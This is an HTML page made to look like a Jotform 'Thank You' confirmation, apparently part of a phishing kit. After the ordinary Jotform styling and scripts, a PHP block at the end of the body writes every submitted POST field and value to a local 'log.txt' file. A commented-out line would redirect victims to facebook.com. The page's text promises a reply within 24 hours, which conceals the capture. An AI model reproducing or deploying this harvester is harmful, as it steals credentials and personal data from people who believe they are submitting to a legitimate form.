<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta name="HandheldFriendly" content="true">
    <title>Thank You</title>
    <link rel="shortcut icon" href="https://cdn.jotfor.ms/assets/img/favicons/favicon-2021-light.ico">
    <script type="text/javascript" src="thank_you_files/prototype.js"></script>
    <link type="text/css" rel="stylesheet" href="thank_you_files/thankyou.css">
    <style type="text/css">
      body {
        background:  #ffffff;
        font-family: Inter, sans-serif;
        font-size: 16px;
        color: #000000;
      }
      .form-all {
        background:  #ffffff;
        max-width: 752px;
      }
      .thankyou-sub-text {
        color: #000000;
      }
      #footer {
        max-width: 752px;
      }

      .thankYouDownloadPDFWrapper {
        border-top: 1px solid  #ffffff;
      }
      .ty-buttons.thankYouEditSubmission, .ty-buttons.thankYouDownloadPDF { 
        color: #000000;
        background-color: #ffffff;
        border-color: #000000;
      }
      .ty-buttons.thankYouFillAgain { 
        color: #000000;
        background-color: #ffffff;
        border-color: #000000;
      }
      @media print {
       .form-all {
        width: 752px;
       } 

      }
    </style>
    <style type="text/css">
    .form-all {
    box-shadow : 0 9px 40px rgba(42, 42, 42);
}

.supernova {
   background: #304352;  /* fallback for old browsers */
background: -webkit-linear-gradient(to right, #d7d2cc, #304352);  /* Chrome 10-25, Safari 5.1-6 */
background: linear-gradient(to right, #d7d2cc, #304352); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */

}

.form-all {
    border : 10px solid;
    border-image-slice : 1;
    border-width : 20px;
    border-image-source : linear-gradient(to left, #d7d2cc, #d7d2cc);
}

.form-all { padding:0 10px;
        padding-bottom: 30px;
        }
    .wrapper {
        display: flex;
        min-height: 370px;
        margin:0 auto;
        justify-content:center;
        flex-direction: column;
      }
      .wrapper.isPDF {
        min-height: 250px;
      }
    div  img {
        margin: 24px 0 0;
      }
      [class*="col-"]{
        text-align:center;
        display:flex;
        flex-direction: column;
      }
      .col-1 img{
        width:100%;
        max-width:153px;
      }
      .col-1 {
        justify-content: center;
        align-items: center;
      }
      .col-2{
        display: flex;
        flex-direction: column;
        align-items:center;
        justify-content:center;
        padding: 16px;
}
      @media screen and (max-width: 480px) {
 .wrapper {
          display: inline;
               min-height: 470px;
                height: 100vh;}
      }div.wrapper .col-1 {
 background-size: ;
}

    </style>
	
	
  </head>
  
  <body class="thankyou">
    <div id="stage" class="form-all">
      <div class="thankyou-wrapper"><p class="thank-you-icon" style="text-align:center;"><img src="thank_you_files/Thankyou-iconV2.png" alt="" width="153" height="156"></p><div style="text-align:center;"><h1 class="thankyou-main-text ty-text" style="text-align:center;">Thank You!</h1><p class="thankyou-sub-text ty-text" style="text-align:center;">Your submission has been received. We will revert on your submitted email id in the next 24 hours</p></div></div>
      
    </div>
    <div id="footer" class="form-footer">
      
    </div>
  
  <script type="text/javascript">
    if (window.parent !== window) {
      var stageMarginTop = ($('stage')) ? parseInt($('stage').getStyle('marginTop')) : 0;
      var height = $$('body').first().getHeight() + (stageMarginTop * 2);
      window.parent.postMessage('setHeight:' + height + ':221311368769460', '*');
      window.parent.postMessage({ action: 'submission-completed', formID: '221311368769460' }, '*');
    }
    // Prevent duplicate submissions caused by reloading thank you pages
    var origin = 'https://submit.jotform.com/';
    var url = origin + '221311368769460';
    // be sure of being same origin before using referrer
    if (document.referrer && document.referrer.indexOf(origin) !== -1) {
      url = document.referrer;
    }

    if (url.indexOf("/submit/221311368769460") !== -1) {
      url = url.replace("/submit/","/");
    }

    if ('false' !== 'true') {
      window.history.replaceState("", "", url);
    }
    window.newThankYouPage = true;
    window.submissionID = '';
    window.formID = '221311368769460';
    var favicon = document.querySelector('link[rel="shortcut icon"]');
    window.isDarkMode = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);
    if(favicon && window.isDarkMode) {
      favicon.href = favicon.href.replaceAll('favicon-2021-light.ico', 'favicon-2021-dark.ico');
    }
  </script>
  <script src="thank_you_files/thankYouPageScripts.js"></script>
  
<?php
#header ('Location: facebook.com');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
</body></html>